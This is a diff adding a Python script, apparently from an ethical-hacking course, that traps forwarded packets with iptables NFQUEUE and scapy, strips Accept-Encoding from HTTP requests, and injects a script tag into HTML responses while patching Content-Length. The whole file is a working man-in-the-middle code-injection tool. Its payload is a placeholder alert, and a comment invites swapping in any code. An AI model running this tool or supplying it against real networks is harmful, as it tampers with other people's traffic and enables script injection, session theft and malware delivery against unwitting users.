@@ -1,0 +1,47 @@
+#!/usr/bin python
+# create a queue to trap packets using iptables -I FORWARD -j NFQUEUE --queue-num 0 then :
+from encodings.utf_8 import encode
+import netfilterqueue  # install from github if you get error with pip
+import scapy.all as scapy
+import re 
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len  # the below lines is to remove the length and checksum from the response as it will courpt our programs
+    del packet[scapy.IP].chksum  # the check sum makes sure that the packet has not been modifyed thus we need to remove it
+    del packet[scapy.TCP].chksum  # scapy will recreate the len and chksum after we modify the response
+    return packet
+
+
+def process_packet(packet):  # the packet trapped in the q
+    scapy_packet = scapy.IP(packet.get_payload())  # wrapping the payload with scapy ip layer
+    if scapy_packet.haslayer(scapy.Raw):# if the pack has  http layer
+        try:
+            load = scapy_packet[scapy.Raw].load.decode()# decode to covnert it to string from byte like object
+            if scapy_packet[scapy.TCP].dport == 80:# to filter out http packets leaving means its an http request
+                print("[+] Request")
+                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)# the regex from pythex, replace this field with empyty string
+
+            elif scapy_packet[scapy.TCP].sport == 80:  # to filter out http responses
+                print("[+] Response")
+                injection_code = "<script>alert('test');</script>"# replace this will code you want to inject
+                load = load.replace("</body>", injection_code + "</body>") 
+                # print(scapy_packet.show())
+                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)  # regex search for content length in load. the () to sperate regex into two groups, the ?: from the pthyex cheat sheet tells python to look for content length but dont include it in the refualer expression
+                if content_length_search and "text/html" in load:  # not all responses will have content length so if we have a content length do the below
+                    content_length = content_length_search.group(1)  # 0 means its the first thing it will match of the whole string, 1 to use the second group
+                    new_content_length = int(content_length) + len(injection_code)  # this will add the injection code value to the value of the content length
+                    load = load.replace(content_length, str(new_content_length))  # to replace the content length with the new one
+
+            if load != scapy_packet[scapy.Raw].load:  
+                new_packet = set_load(scapy_packet, load)
+                packet.set_payload(bytes(new_packet)) 
+        except UnicodeDecodeError:# if the above code fails pass
+            pass
+
+    packet.accept()
+
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run() 
